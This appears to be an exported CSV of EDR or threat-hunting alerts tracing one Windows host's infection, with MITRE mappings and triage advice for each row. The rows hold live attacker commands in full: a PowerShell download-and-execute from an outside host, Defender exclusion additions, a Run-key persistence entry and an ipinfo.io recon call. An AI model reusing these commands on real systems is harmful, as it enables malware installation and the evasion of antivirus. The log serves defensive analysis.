Timestamp,Process,Parent Process,Command Line,Detection Type,Risk Score,Investigation Reason,Source IP,Destination IP,Registry Path,File Path,DNS Query,Event Action,PID,MITRE Technique,MITRE Name,Allowlisted,Severity,Confidence,FP Assessment,Analyst Verdict,Recommendation,Alert ID
"Jun 1, 2026 @ 14:22:58.483",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""Invoke-WebRequest -Uri 'https://tuasesoriadigital.es/default.dat' -Outfile 'office_portable_x3.exe'; Start-Process 'office_portable_x3.exe'""",Download Execute | LOLBin Abuse | PowerShell Payload | Rare Parent-Child | Sigma Match | Suspicious User-Agent / Tool,100,Rare process pair: powershell.exe->powershell.exe ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Download-then-execute pattern detected,,,,,,end,"1,860",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Isolate host; retrieve and sandbox the downloaded payload,AH-6040AB77
"Jun 1, 2026 @ 14:21:40.989",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,100,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DFC56D55DB77388291.TMP,,deletion,"5,516",T1218,,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-38382216
"Jun 1, 2026 @ 14:21:40.994",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,100,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DF4A4E0E2313FC8971.TMP,,deletion,"5,516",T1218,,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-121FCB8C
"Jun 1, 2026 @ 14:21:42.916",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,100,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DFD36A845BD7300A43.TMP,,deletion,"5,516",T1218,,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-1DD61115
"Jun 1, 2026 @ 14:23:04.854",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\VCRUNTIME140.dll,,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-971A881F
"Jun 1, 2026 @ 14:23:04.855",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_ctypes.pyd,,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-E91DD816
"Jun 1, 2026 @ 14:23:04.856",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_hashlib.pyd,,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-688556DD
"Jun 1, 2026 @ 14:23:04.857",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\_socket.pyd,,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-2B9908F6
"Jun 1, 2026 @ 14:21:39.780",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,100,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DF7AAB9AA78FEB7B35.TMP,,deletion,"5,516",T1218,,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-3CA6DD40
"Jun 1, 2026 @ 14:21:39.784",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,100,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DF3D94649558FCEF55.TMP,,creation,"5,516",T1218,,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-71176096
"Jun 1, 2026 @ 14:23:27.243",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002w.txt,,deletion,"12,756",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-A4A276DD
"Jun 1, 2026 @ 14:23:27.244",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\data_p002\002_d.js,,deletion,"12,756",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-1F43A822
"Jun 1, 2026 @ 14:23:27.266",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\VCRUNTIME140_1.dll,,deletion,"12,756",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-7113A835
"Jun 1, 2026 @ 14:23:27.267",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_ctypes.pyd,,deletion,"12,756",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-385F9347
"Jun 1, 2026 @ 14:23:27.268",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI127562\_socket.pyd,,deletion,"12,756",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-CBB520BF
"Jun 1, 2026 @ 14:24:04.296",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,100,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,127.0.0.1,127.0.0.1,,,,connection_attempted,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-D059498A
"Jun 1, 2026 @ 14:24:04.329",C:\Users\Public\Pictures\kelotopu\uusd.exe,,,Malware Staging | Network Outlier | Sigma Match,100,Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper,127.0.0.1,127.0.0.1,,,,connection_attempted,"7,288",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-E5210C99
"Jun 1, 2026 @ 14:24:52.516",C:\Users\Public\Pictures\kelotopu\uusd.exe,C:\Windows\System32\wscript.exe,"""C:\Users\Public\Pictures\kelotopu\uusd.exe"" ",EDR Rule Detection | Malware Staging | Network Outlier | Sigma Match,100,"Security rule fired on: uusd.exe | ""C:\Users\Public\Pictures\kelotopu\uusd.exe""  ; Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper",,,,,,rule_detection,"7,288",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-4D937D62
"Jun 1, 2026 @ 14:23:14.527",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL\AppData\Local\Temp'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,"Security rule fired on: powershell.exe | powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL\AppData\Local\Temp'"" ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath'",,,,,,rule_detection,"33,860",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-33645CB7
"Jun 1, 2026 @ 14:23:15.469",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\cmd.exe'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,"Security rule fired on: powershell.exe | powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\cmd.exe'"" ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess'",,,,,,rule_detection,"10,492",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-F5F882B3
"Jun 1, 2026 @ 14:23:16.610",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\clip.exe'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,"Security rule fired on: powershell.exe | powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\clip.exe'"" ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess'",,,,,,rule_detection,"11,540",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-8391357B
"Jun 1, 2026 @ 14:23:20.095",C:\Windows\System32\curl.exe,C:\Users\DELL\office_portable_x3.exe,curl -s --max-time 10 https://ipinfo.io/country,EDR Rule Detection | LOLBin Abuse | Recon / IP Discovery,100,Security rule fired on: curl.exe | curl -s --max-time 10 https://ipinfo.io/country ; Living-off-the-land binary: curl.exe ; Recon DNS query: ipinfo.io,,,,,ipinfo.io,rule_detection,"21,052",T1016,System Network Config Discovery,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-6478D627
"Jun 1, 2026 @ 14:23:26.149",C:\Windows\System32\reg.exe,C:\Users\DELL\office_portable_x3.exe,"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v xuvotopo /t REG_SZ /d ""wscript.exe \""C:\Users\Public\Pictures\kelotopu\xuvotopo.js\"""" /f",EDR Rule Detection | LOLBin Abuse | Persistence | Sigma Match,100,"Security rule fired on: reg.exe | reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v xuvotopo /t REG_SZ /d ""wscript.exe \""C ; Living-off-the-land binary: reg.exe ; Persistence registry path: hklm\software\microsoft\windows\currentversion\run\xuvotopo ; reg.exe adding a Run key entry",,,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\xuvotopo,,,rule_detection,"12,252",T1547.001,Registry Run Keys / Startup Folder,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-7625CDB0
"Jun 1, 2026 @ 14:23:53.261",C:\Users\DELL\office_portable_x3.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Users\DELL\office_portable_x3.exe"" ",EDR Rule Detection | Malware Staging | Sigma Match,100,"Security rule fired on: office_portable_x3.exe | ""C:\Users\DELL\office_portable_x3.exe""  ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper",,,,,,rule_detection,"9,916",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-AC78AF4A
"Jun 1, 2026 @ 14:23:53.265",C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,"""C:\Users\DELL\office_portable_x3.exe"" ",EDR Rule Detection | Malware Staging | Sigma Match,100,"Security rule fired on: office_portable_x3.exe | ""C:\Users\DELL\office_portable_x3.exe""  ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper",,,,,,rule_detection,"22,348",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-2F2CDD05
"Jun 1, 2026 @ 14:23:53.295",C:\Users\DELL\office_portable_x3.exe,C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,EDR Rule Detection | Malware Staging | Sigma Match,100,Security rule fired on: office_portable_x3.exe | C:\Users\DELL\office_portable_x3.exe ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,rule_detection,"12,756",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-C18C29B9
"Jun 1, 2026 @ 14:23:53.298",C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,C:\Users\DELL\office_portable_x3.exe,EDR Rule Detection | Malware Staging | Sigma Match,100,Security rule fired on: office_portable_x3.exe | C:\Users\DELL\office_portable_x3.exe ; Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,,,rule_detection,"30,312",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-5700B394
"Jun 1, 2026 @ 14:23:53.301",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,"Security rule fired on: powershell.exe | powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'"" ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath'",,,,,,rule_detection,"6,972",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-A0823433
"Jun 1, 2026 @ 14:23:53.303",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\kelotopu'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,"Security rule fired on: powershell.exe | powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\kelotopu'"" ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath'",,,,,,rule_detection,"2,204",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-D279226A
"Jun 1, 2026 @ 14:23:53.306",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL\AppData\Local\Temp'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,"Security rule fired on: powershell.exe | powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL\AppData\Local\Temp'"" ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath'",,,,,,rule_detection,"33,860",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-238B5D2D
"Jun 1, 2026 @ 14:23:53.308",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\cmd.exe'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,"Security rule fired on: powershell.exe | powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\cmd.exe'"" ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess'",,,,,,rule_detection,"10,492",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-638A8C7B
"Jun 1, 2026 @ 14:23:53.311",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\clip.exe'""",Defense Evasion | EDR Rule Detection | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,"Security rule fired on: powershell.exe | powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\clip.exe'"" ; Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess'",,,,,,rule_detection,"11,540",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-B1AB19EA
"Jun 1, 2026 @ 14:23:53.314",C:\Windows\System32\curl.exe,C:\Users\DELL\office_portable_x3.exe,curl -s --max-time 10 https://ipinfo.io/country,EDR Rule Detection | LOLBin Abuse | Recon / IP Discovery,100,Security rule fired on: curl.exe | curl -s --max-time 10 https://ipinfo.io/country ; Living-off-the-land binary: curl.exe ; Recon DNS query: ipinfo.io,,,,,ipinfo.io,rule_detection,"21,052",T1016,System Network Config Discovery,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-98E2C824
"Jun 1, 2026 @ 14:24:02.280",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",EDR Rule Detection | LOLBin Abuse | Sigma Match | Suspicious Parent-Child | Svchost Script Spawn,100,"Security rule fired on: wscript.exe | ""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js ; Living-off-the-land binary: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost spawned script engine with suspicious path: ""c:\windows\system32\wscript.exe"" c:\users\public\pictures\kelotopu\xuvotopo.js",,,,,,rule_detection,"33,896",T1059.005,Visual Basic,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-BF21A762
"Jun 1, 2026 @ 14:24:02.704",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",EDR Rule Detection | LOLBin Abuse | Sigma Match | Suspicious Parent-Child | Svchost Script Spawn,100,"Security rule fired on: wscript.exe | ""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js ; Living-off-the-land binary: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost spawned script engine with suspicious path: ""c:\windows\system32\wscript.exe"" c:\users\public\pictures\kelotopu\xuvotopo.js",,,,,,rule_detection,"33,896",T1059.005,Visual Basic,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-205C8635
"Jun 1, 2026 @ 14:24:03.113",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",EDR Rule Detection | LOLBin Abuse | Sigma Match | Suspicious Parent-Child | Svchost Script Spawn,100,"Security rule fired on: wscript.exe | ""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js ; Living-off-the-land binary: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost spawned script engine with suspicious path: ""c:\windows\system32\wscript.exe"" c:\users\public\pictures\kelotopu\xuvotopo.js",,,,,,rule_detection,"33,896",T1059.005,Visual Basic,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-B3937651
"Jun 1, 2026 @ 14:24:03.128",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",EDR Rule Detection | LOLBin Abuse | Sigma Match | Suspicious Parent-Child | Svchost Script Spawn,100,"Security rule fired on: wscript.exe | ""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js ; Living-off-the-land binary: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost spawned script engine with suspicious path: ""c:\windows\system32\wscript.exe"" c:\users\public\pictures\kelotopu\xuvotopo.js",,,,,,rule_detection,"33,896",T1059.005,Visual Basic,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-5912DCB3
"Jun 1, 2026 @ 14:24:03.693",C:\Users\Public\Pictures\kelotopu\uusd.exe,C:\Windows\System32\wscript.exe,"""C:\Users\Public\Pictures\kelotopu\uusd.exe"" ",EDR Rule Detection | Malware Staging | Network Outlier | Sigma Match,100,"Security rule fired on: uusd.exe | ""C:\Users\Public\Pictures\kelotopu\uusd.exe""  ; Execution from user-writable path: c:\users\public\pictures\kelotopu\uusd.exe ; High distinct destinations for uusd.exe ; Executable running from Users/ directory — possible dropper",,,,,,rule_detection,"7,288",T1036,Masquerading,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-97AB148B
"Jun 1, 2026 @ 14:24:52.501",C:\Windows\System32\reg.exe,C:\Users\DELL\office_portable_x3.exe,"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v xuvotopo /t REG_SZ /d ""wscript.exe \""C:\Users\Public\Pictures\kelotopu\xuvotopo.js\"""" /f",EDR Rule Detection | LOLBin Abuse | Persistence | Sigma Match,100,"Security rule fired on: reg.exe | reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v xuvotopo /t REG_SZ /d ""wscript.exe \""C ; Living-off-the-land binary: reg.exe ; Persistence registry path: hklm\software\microsoft\windows\currentversion\run\xuvotopo ; reg.exe adding a Run key entry",,,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\xuvotopo,,,rule_detection,"12,252",T1547.001,Registry Run Keys / Startup Folder,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-9168EEB0
"Jun 1, 2026 @ 14:24:52.504",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",EDR Rule Detection | LOLBin Abuse | Sigma Match | Suspicious Parent-Child | Svchost Script Spawn,100,"Security rule fired on: wscript.exe | ""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js ; Living-off-the-land binary: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost spawned script engine with suspicious path: ""c:\windows\system32\wscript.exe"" c:\users\public\pictures\kelotopu\xuvotopo.js",,,,,,rule_detection,"33,896",T1059.005,Visual Basic,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-329AF738
"Jun 1, 2026 @ 14:24:52.508",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",EDR Rule Detection | LOLBin Abuse | Sigma Match | Suspicious Parent-Child | Svchost Script Spawn,100,"Security rule fired on: wscript.exe | ""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js ; Living-off-the-land binary: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost spawned script engine with suspicious path: ""c:\windows\system32\wscript.exe"" c:\users\public\pictures\kelotopu\xuvotopo.js",,,,,,rule_detection,"33,896",T1059.005,Visual Basic,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-CE80C87B
"Jun 1, 2026 @ 14:24:52.510",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",EDR Rule Detection | LOLBin Abuse | Sigma Match | Suspicious Parent-Child | Svchost Script Spawn,100,"Security rule fired on: wscript.exe | ""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js ; Living-off-the-land binary: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost spawned script engine with suspicious path: ""c:\windows\system32\wscript.exe"" c:\users\public\pictures\kelotopu\xuvotopo.js",,,,,,rule_detection,"33,896",T1059.005,Visual Basic,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-9C84DAE0
"Jun 1, 2026 @ 14:24:52.513",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",EDR Rule Detection | LOLBin Abuse | Sigma Match | Suspicious Parent-Child | Svchost Script Spawn,100,"Security rule fired on: wscript.exe | ""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js ; Living-off-the-land binary: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost spawned script engine with suspicious path: ""c:\windows\system32\wscript.exe"" c:\users\public\pictures\kelotopu\xuvotopo.js",,,,,,rule_detection,"33,896",T1059.005,Visual Basic,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Triage immediately — native EDR rule fired on this event,AH-6E3AF984
